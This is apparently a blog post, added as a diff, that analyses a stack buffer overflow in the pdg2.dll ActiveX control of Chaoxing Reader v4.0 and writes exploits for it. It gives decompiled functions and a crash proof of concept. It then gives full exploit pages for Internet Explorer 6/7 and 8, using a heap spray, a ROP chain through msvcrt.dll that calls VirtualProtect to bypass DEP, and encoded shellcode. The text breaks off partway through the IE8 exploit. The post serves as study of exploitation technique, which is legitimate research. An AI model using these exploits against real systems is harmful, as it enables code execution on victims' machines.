@@ -1,0 +1,772 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.2" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="Windows,Exploitation," />
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.2" />
+
+
+
+
+
+
+<meta name="description" content="超星阅览器v4.0版本中的ActiveX插件pdg2.dll存在栈溢出漏洞，调用LoadPage函数时没有对参数长度作限制，从而可以getshell，之所以调这个漏洞，是想学习一下IE8下的heap spray，参考的这篇文章：HeapSpray+ROP绕过IE8的DEP防护 ——堆喷射技术利用超星老漏洞 0x01 分析环境1231 Windows XP Service Pack 32 Inter">
+<meta name="keywords" content="Windows,Exploitation">
+<meta property="og:type" content="article">
+<meta property="og:title" content="超星阅览器v4.0 - pdg2.dll Stack Buffer Overflow">
+<meta property="og:url" content="http://yoursite.com/2017/08/21/chaoxing-reader-4-0-md/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="超星阅览器v4.0版本中的ActiveX插件pdg2.dll存在栈溢出漏洞，调用LoadPage函数时没有对参数长度作限制，从而可以getshell，之所以调这个漏洞，是想学习一下IE8下的heap spray，参考的这篇文章：HeapSpray+ROP绕过IE8的DEP防护 ——堆喷射技术利用超星老漏洞 0x01 分析环境1231 Windows XP Service Pack 32 Inter">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://yoursite.com/2017/08/21/chaoxing-reader-4-0-md/images/chaoxing%20reader%204.0/0x02-1.png">
+<meta property="og:updated_time" content="2017-08-21T03:58:34.966Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="超星阅览器v4.0 - pdg2.dll Stack Buffer Overflow">
+<meta name="twitter:description" content="超星阅览器v4.0版本中的ActiveX插件pdg2.dll存在栈溢出漏洞，调用LoadPage函数时没有对参数长度作限制，从而可以getshell，之所以调这个漏洞，是想学习一下IE8下的heap spray，参考的这篇文章：HeapSpray+ROP绕过IE8的DEP防护 ——堆喷射技术利用超星老漏洞 0x01 分析环境1231 Windows XP Service Pack 32 Inter">
+<meta name="twitter:image" content="http://yoursite.com/2017/08/21/chaoxing-reader-4-0-md/images/chaoxing%20reader%204.0/0x02-1.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    sidebar: {"position":"left","display":"post","offset":12,"offset_float":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: true,
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2017/08/21/chaoxing-reader-4-0-md/"/>
+
+
+
+
+
+  <title>超星阅览器v4.0 - pdg2.dll Stack Buffer Overflow | Hexo</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Hexo</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/08/21/chaoxing-reader-4-0-md/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">超星阅览器v4.0 - pdg2.dll Stack Buffer Overflow</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-08-21T11:37:18+08:00">
+                2017-08-21
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Vulnerability/" itemprop="url" rel="index">
+                    <span itemprop="name">Vulnerability</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>超星阅览器v4.0版本中的ActiveX插件pdg2.dll存在栈溢出漏洞，调用<code>LoadPage</code>函数时没有对参数长度作限制，从而可以getshell，之所以调这个漏洞，是想学习一下IE8下的heap spray，参考的这篇文章：<a href="http://blog.csdn.net/qs_hud/article/details/9821735" target="_blank" rel="external">HeapSpray+ROP绕过IE8的DEP防护 ——堆喷射技术利用超星老漏洞</a></p>
+<h2 id="0x01-分析"><a href="#0x01-分析" class="headerlink" title="0x01 分析"></a>0x01 分析</h2><h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">1 Windows XP Service Pack 3</div><div class="line">2 Internet Explorer 6/7/8</div><div class="line">3 超星阅览器v4.0</div></pre></td></tr></table></figure>
+<h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>触发IE崩溃的脚本如下：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">classid</span>=<span class="string">'clsid:7F5E27CE-4A5C-11D3-9232-0000B48A05B2'</span> <span class="attr">id</span>=<span class="string">'target'</span> &gt;</span><span class="tag">&lt;/<span class="name">object</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></div><div class="line"><span class="undefined"></span></div><div class="line"><span class="undefined">var arg1 = ""</span></div><div class="line"><span class="xml">while(arg1.length <span class="tag">&lt; <span class="attr">1000</span>) <span class="attr">arg1</span> += <span class="string">"A"</span>;</span></span></div><div class="line"><span class="undefined">var arg2=1</span></div><div class="line"><span class="undefined">var arg3=1</span></div><div class="line"><span class="undefined">var arg4=1</span></div><div class="line"><span class="undefined"></span></div><div class="line"><span class="undefined">target.LoadPage(arg1,arg2,arg3,arg4);</span></div><div class="line"><span class="undefined"></span></div><div class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure>
+<p>漏洞点在pdg2.dll中的函数<code>sub_1001CD30</code>里，调用<code>WideCharToMultiByte</code>函数将unicode字符串转换成多字节字符串时造成栈溢出，<code>lpString</code>即为<code>LoadPage</code>的第一个参数：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">int</span> __<span class="function">stdcall <span class="title">sub_1001CD30</span><span class="params">(<span class="keyword">int</span> a1, LPCWSTR lpString, <span class="keyword">int</span> a3, <span class="keyword">int</span> a4, <span class="keyword">int</span> a5)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">  ......</div><div class="line">  <span class="keyword">if</span> ( lpString )</div><div class="line">  &#123;</div><div class="line">    v7 = lstrlenW(lpString);</div><div class="line">    v8 = <span class="number">2</span> * v7 + <span class="number">2</span>;</div><div class="line">    v9 = <span class="number">2</span> * v7 + <span class="number">5</span>;</div><div class="line">    LOBYTE(v9) = v9 &amp; <span class="number">0xFC</span>;</div><div class="line">    v10 = alloca(v9);</div><div class="line">    v11 = <span class="number">0</span>;</div><div class="line">    WideCharToMultiByte(<span class="number">0</span>, <span class="number">0</span>, lpString, <span class="number">-1</span>, &amp;v11, v8, <span class="number">0</span>, <span class="number">0</span>);</div><div class="line">    sub_10015AD0(&amp;v11);</div><div class="line">    result = <span class="number">0</span>;</div><div class="line">  &#125;</div><div class="line">  ......</div><div class="line">  <span class="keyword">return</span> result;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>动态调试就会发现，触发IE崩溃的并不是函数<code>sub_1001CD30</code>，因为压根执行不到ret处，在调用的子函数里面就已经崩了，跟进<code>sub_10015AD0</code>函数里：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">int</span> __<span class="function">thiscall <span class="title">sub_10015AD0</span><span class="params">(<span class="keyword">int</span> <span class="keyword">this</span>, <span class="keyword">int</span> a2)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">  <span class="keyword">int</span> v2; <span class="comment">// esi@1</span></div><div class="line"></div><div class="line">  v2 = <span class="keyword">this</span>;</div><div class="line">  *(_DWORD *)(<span class="keyword">this</span> + <span class="number">16484</span>) = <span class="number">0</span>;</div><div class="line">  sub_10012D10(a2, <span class="number">0</span>);</div><div class="line">  <span class="keyword">return</span> sub_10015AB0(v2);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>继续跟进<code>sub_10012D10</code>函数里，该函数第二个参数<code>a2</code>即是前面转换成的多字节字符串，首先从字符串的最后一字节开始搜索，直到找到某个字符不为<code>&#39;\\&#39;、&#39;/&#39;、&#39; &#39;</code>，然后将该字符之前的所有内容（包括该字符）拷贝到局部变量<code>v11</code>，然后调用函数<code>sub_10013DC0</code>。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">int</span> __<span class="function">thiscall <span class="title">sub_10012D10</span><span class="params">(<span class="keyword">void</span> *<span class="keyword">this</span>, <span class="keyword">const</span> <span class="keyword">char</span> *a2, <span class="keyword">int</span> a3)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">  ......</div><div class="line">  v3 = (<span class="keyword">int</span>)<span class="keyword">this</span>;</div><div class="line">  sub_10001590(<span class="number">333</span>, <span class="number">0</span>, <span class="number">0</span>);</div><div class="line">  v4 = <span class="built_in">strlen</span>(a2) - <span class="number">1</span>;</div><div class="line">  <span class="keyword">do</span></div><div class="line">  &#123;</div><div class="line">    v5 = a2[v4];</div><div class="line">    <span class="keyword">if</span> ( v5 != <span class="string">'\\'</span> &amp;&amp; v5 != <span class="string">'/'</span> &amp;&amp; v5 != <span class="string">' '</span> )</div><div class="line">      <span class="keyword">break</span>;</div><div class="line">    v6 = v4--;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">while</span> ( v6 &gt; <span class="number">0</span> );</div><div class="line">  <span class="keyword">if</span> ( v4 &lt; <span class="number">0</span> )</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">  qmemcpy(&amp;v11, a2, v4 + <span class="number">1</span>);</div><div class="line">  v12[v4] = <span class="number">0</span>;</div><div class="line">  v10 = &amp;v11;</div><div class="line">  sub_10013DC0(&amp;v10, &amp;v11);</div><div class="line">  v8 = *(_DWORD *)(v3 + <span class="number">10104</span>);</div><div class="line">  *(_DWORD *)(v3 + <span class="number">10116</span>) = <span class="number">0</span>;</div><div class="line">  <span class="keyword">if</span> ( v8 )</div><div class="line">  &#123;</div><div class="line">  ......</div><div class="line">  &#125;</div><div class="line">  ......</div><div class="line">  <span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>程序的在函数<code>sub_10013DC0</code>里发生崩溃，该函数将字符串a3拷贝给String变量造成栈溢出，函数结束时返回地址被无效指针覆盖，返回地址偏移为<code>0x100</code>：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">char</span> __<span class="function">thiscall <span class="title">sub_10013DC0</span><span class="params">(_DWORD *<span class="keyword">this</span>, <span class="keyword">void</span> **a2, <span class="keyword">const</span> <span class="keyword">char</span> *a3)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">  ......</div><div class="line">  v3 = <span class="keyword">this</span>;</div><div class="line">  v4 = <span class="built_in">strlen</span>(a3) + <span class="number">1</span>;</div><div class="line">  v5 = v4;</div><div class="line">  v4 &gt;&gt;= <span class="number">2</span>;</div><div class="line">  qmemcpy(String, a3, <span class="number">4</span> * v4);</div><div class="line">  v7 = &amp;a3[<span class="number">4</span> * v4];</div><div class="line">  v6 = &amp;String[<span class="number">4</span> * v4];</div><div class="line">  LOBYTE(v4) = v5;</div><div class="line">  v8 = v3[<span class="number">4069</span>];</div><div class="line">  qmemcpy(v6, v7, v4 &amp; <span class="number">3</span>);</div><div class="line">  <span class="keyword">if</span> ( v8 != <span class="number">1</span></div><div class="line">    || !_strnicmp(String, aHttp, <span class="number">7u</span>)</div><div class="line">    || (v9 = &amp;String[lstrlenA(String)], _strnicmp(v9 - <span class="number">3</span>, aPdg, <span class="number">3u</span>))</div><div class="line">    || *(v9 - <span class="number">11</span>) != <span class="number">92</span></div><div class="line">    || (v10 = (<span class="keyword">int</span>)(v9 - <span class="number">10</span>), *(v9 - <span class="number">10</span>) != <span class="number">48</span>) )</div><div class="line">  &#123;</div><div class="line">    result = <span class="number">0</span>;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">else</span></div><div class="line">  &#123;</div><div class="line">  ......</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">return</span> result;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>另外需要注意的是，我们输入的参数会先转化为unicode，然后再在函数<code>sub_1001CD30</code>中调用<code>WideCharToMultiByte</code>转化为ASCII，如果字符有超过0x7f的话，两次转化之后会变成0x3f(即”?”)，所以在写exp的时候需要注意。</p>
+<h2 id="0x02-exp编写"><a href="#0x02-exp编写" class="headerlink" title="0x02 exp编写"></a>0x02 exp编写</h2><h3 id="IE6-IE7"><a href="#IE6-IE7" class="headerlink" title="IE6/IE7"></a>IE6/IE7</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">classid</span>=<span class="string">'clsid:7F5E27CE-4A5C-11D3-9232-0000B48A05B2'</span> <span class="attr">id</span>=<span class="string">'target'</span> &gt;</span><span class="tag">&lt;/<span class="name">object</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></div><div class="line"><span class="undefined"></span></div><div class="line"><span class="undefined">var nops = unescape("%u9090%u9090");</span></div><div class="line"><span class="undefined">var shellcode = unescape('%ue8fc%u0082%u0000%u8960%u31e5%u64c0%u508b%u8b30%u0c52%u528b%u8b14%u2872%ub70f%u264a%uff31%u3cac%u7c61%u2c02%uc120%u0dcf%uc701%uf2e2%u5752%u528b%u8b10%u3c4a%u4c8b%u7811%u48e3%ud101%u8b51%u2059%ud301%u498b%ue318%u493a%u348b%u018b%u31d6%uacff%ucfc1%u010d%u38c7%u75e0%u03f6%uf87d%u7d3b%u7524%u58e4%u588b%u0124%u66d3%u0c8b%u8b4b%u1c58%ud301%u048b%u018b%u89d0%u2444%u5b24%u615b%u5a59%uff51%u5fe0%u5a5f%u128b%u8deb%u6a5d%u8d01%ub285%u0000%u5000%u3168%u6f8b%uff87%ubbd5%ub5f0%u56a2%ua668%ubd95%uff9d%u3cd5%u7c06%u800a%ue0fb%u0575%u47bb%u7213%u6a6f%u5300%ud5ff%u6163%u636c%u4100');</span></div><div class="line"><span class="xml">while(nops.length <span class="tag">&lt; <span class="attr">0x100000</span>) <span class="attr">nops</span> += <span class="string">nops;</span></span></span></div><div class="line"><span class="undefined">nops = nops.substring(0,0x100000/2-32/2-4/2-2/2-shellcode.length);</span></div><div class="line"><span class="undefined">nops = nops + shellcode;</span></div><div class="line"><span class="undefined"></span></div><div class="line"><span class="undefined">var memory = new Array();</span></div><div class="line"><span class="undefined">for(var i=0;i&lt;500;i++)&#123;</span></div><div class="line"><span class="undefined">	memory[i] += nops;</span></div><div class="line"><span class="undefined">&#125;</span></div><div class="line"><span class="undefined">alert("Test");</span></div><div class="line"><span class="undefined"></span></div><div class="line"><span class="undefined">var arg1 = ""</span></div><div class="line"><span class="xml">while(arg1.length <span class="tag">&lt; <span class="attr">256</span>) <span class="attr">arg1</span> += <span class="string">"A"</span>;</span></span></div><div class="line"><span class="undefined">arg1 += "\x0c\x0c\x0c\x0c";</span></div><div class="line"><span class="undefined">var arg2=1</span></div><div class="line"><span class="undefined">var arg3=1</span></div><div class="line"><span class="undefined">var arg4=1</span></div><div class="line"><span class="undefined"></span></div><div class="line"><span class="undefined">target.LoadPage(arg1,arg2,arg3,arg4);</span></div><div class="line"><span class="undefined"></span></div><div class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure>
+<p>这里<code>memory[i] += nops</code>如果写成<code>memory[i] = nops</code>，则不会分配大的堆块，导致覆盖不到0x0c0c0c0c的地址，应该与javascript的深拷贝和浅拷贝有关，浅拷贝的话两个变量指向同一个对象，深拷贝的话才拷贝内容。</p>
+<p>如果改成<code>memory[i] = nops + unescape(&quot;%u9090&quot;)</code>或者<code>memory[i] = nops.substring(0,nops.length)</code>这样可以。</p>
+<p>另外，参考文章里提到下面这句，32指堆块首部，4字节指javascript的BSTR字符串头部，2字节为字符串结束符。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nops = nops.substring(0,0x100000/2-32/2-4/2-2/2-shellcode.length);</div></pre></td></tr></table></figure>
+<p><img src="images/chaoxing reader 4.0/0x02-1.png" alt="Heap spray"></p>
+<p>在调试过程中，并没有发现堆块有32字节的首部，只看到8字节的首部，所以对此不太理解。</p>
+<h3 id="IE8"><a href="#IE8" class="headerlink" title="IE8"></a>IE8</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">classid</span>=<span class="string">'clsid:7F5E27CE-4A5C-11D3-9232-0000B48A05B2'</span> <span class="attr">id</span>=<span class="string">'target'</span> &gt;</span><span class="tag">&lt;/<span class="name">object</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></div><div class="line"><span class="undefined">var nops = unescape("%9090%u9090");</span></div><div class="line"><span class="undefined">var shellcode = unescape('%ue8fc%u0082%u0000%u8960%u31e5%u64c0%u508b%u8b30%u0c52%u528b%u8b14%u2872%ub70f%u264a%uff31%u3cac%u7c61%u2c02%uc120%u0dcf%uc701%uf2e2%u5752%u528b%u8b10%u3c4a%u4c8b%u7811%u48e3%ud101%u8b51%u2059%ud301%u498b%ue318%u493a%u348b%u018b%u31d6%uacff%ucfc1%u010d%u38c7%u75e0%u03f6%uf87d%u7d3b%u7524%u58e4%u588b%u0124%u66d3%u0c8b%u8b4b%u1c58%ud301%u048b%u018b%u89d0%u2444%u5b24%u615b%u5a59%uff51%u5fe0%u5a5f%u128b%u8deb%u6a5d%u8d01%ub285%u0000%u5000%u3168%u6f8b%uff87%ubbd5%ub5f0%u56a2%ua668%ubd95%uff9d%u3cd5%u7c06%u800a%ue0fb%u0575%u47bb%u7213%u6a6f%u5300%ud5ff%u6163%u636c%u4100');</span></div><div class="line"><span class="undefined"></span></div><div class="line"><span class="undefined">rop_gadgets = unescape(</span></div><div class="line"><span class="undefined">	"%ue146%u77be" + // 0x77bee146 : ,# POP EBP # RETN [msvcrt.dll] </span></div><div class="line"><span class="undefined">	"%ue146%u77be" + // 0x77bee146 : ,# skip 4 bytes [msvcrt.dll]</span></div><div class="line"><span class="undefined">	"%u771a%u77c1" + // 0x77c1771a : ,# POP EBX # RETN [msvcrt.dll] </span></div><div class="line"><span class="undefined">	"%u0201%u0000" + // 0x00000201 : ,# 0x00000201-&gt; ebx</span></div><div class="line"><span class="undefined">	"%ue185%u77c1" + // 0x77c1e185 : ,# POP EDX # RETN [msvcrt.dll] </span></div><div class="line"><span class="undefined">	"%u0040%u0000" + // 0x00000040 : ,# 0x00000040-&gt; edx</span></div><div class="line"><span class="undefined">	"%uc5a3%u77bf" + // 0x77bfc5a3 : ,# POP ECX # RETN [msvcrt.dll] </span></div><div class="line"><span class="undefined">	"%u001f%u77c3" + // 0x77c3001f : ,# &amp;Writable location [msvcrt.dll]</span></div><div class="line"><span class="undefined">	"%u610d%u77c1" + // 0x77c1610d : ,# POP EDI # RETN [msvcrt.dll] </span></div><div class="line"><span class="undefined">	"%u6101%u77c1" + // 0x77c16101 : ,# RETN (ROP NOP) [msvcrt.dll]</span></div><div class="line"><span class="undefined">	"%u4d9a%u77c0" + // 0x77c04d9a : ,# POP ESI # RETN [msvcrt.dll] </span></div><div class="line"><span class="undefined">	"%uaacc%u77bf" + // 0x77bfaacc : ,# JMP [EAX] [msvcrt.dll]</span></div><div class="line"><span class="undefined">	"%uded4%u77c1" + // 0x77c1ded4 : ,# POP EAX # RETN [msvcrt.dll] </span></div><div class="line"><span class="undefined">	"%u1131%u77be" + // 0x77be1120 : ,# ptr to &amp;VirtualProtect() [IAT msvcrt.dll]</span></div><div class="line"><span class="undefined">	"%u67f0%u77c2" + // 0x77c267f0 : ,# PUSHAD # ADD AL,0EF # RETN [msvcrt.dll] </span></div><div class="line"><span class="undefined">	"%u1025%u77c2" + // 0x77c21025 : ,# ptr to 'push esp # ret ' [msvcrt.dll]</span></div><div class="line"><span class="undefined">	""</span></div><div class="line"><span class="undefined">); //  : </span></div><div class="line"><span class="undefined"></span></div><div class="line"><span class="xml">while(nops.length <span class="tag">&lt; <span class="attr">0x1000</span>) <span class="attr">nops</span> += <span class="string">nops;</span></span></span></div><div class="line"><span class="undefined">var before = nops.substring(0,0x5f6);</span></div><div class="line"><span class="undefined">var end = before + rop_gadgets + shellcode + nops.substring(0,0x800-before.length-rop_gadgets.length-shellcode.length);</span></div><div class="line"><span class="xml">while(end.length<span class="tag">&lt;<span class="name">0x40000)</span> <span class="attr">end</span> += <span class="string">end;</span></span></span></div><div class="line"><span class="undefined"></span></div><div class="line"><span class="undefined">var memory = new Array();</span></div><div class="line"><span class="undefined">for(var i=0;i&lt;400;i++)&#123;</span></div><div class="line"><span class="undefined">	memory[i] = end.substring(2,end.length-0x21);</span></div><div class="line"><span class="undefined">&#125;</span></div><div class="line"><span class="undefined">alert("Test");</span></div><div class="line"><span class="undefined"></span></div><div class="line"><span class="undefined">var arg1 = ""</span></div><div class="line"><span class="xml">while(arg1.length <span class="tag">&lt; <span class="attr">256</span>) <span class="attr">arg1</span> += <span class="string">"A"</span>;</span></span></div><div class="line"><span class="undefined">arg1 += "\x1b\x71\x38\x63";	//pop eax;ret</span></div><div class="line"><span class="undefined">arg1 += "\x0c\x0c\x0c\x0c";</span></div><div class="line"><span class="undefined">arg1 += "\x0c\x0c\x0c\x0c";</span></div><div class="line"><span class="undefined">arg1 += "\x0c\x0c\x0c\x0c";</span></div><div class="line"><span class="undefined">arg1 